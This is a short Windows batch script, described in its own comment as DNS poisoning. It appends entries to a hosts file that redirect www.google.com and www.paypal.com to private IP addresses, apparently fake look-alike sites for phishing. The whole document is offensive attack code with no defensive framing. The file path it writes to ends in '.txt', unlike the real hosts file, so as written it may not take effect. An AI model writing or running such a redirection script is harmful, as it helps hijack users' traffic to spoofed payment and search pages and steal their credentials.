@echo off
:: this is DNS poisoning, the www site is replaced by the prev fake site 
echo 10.109.74.45 www.google.com >> C:\windows\system32\drivers\etc\hosts.txt
echo 10.115.46.73 www.paypal.com >> C:\windows\system32\drivers\etc\hosts.txt
exit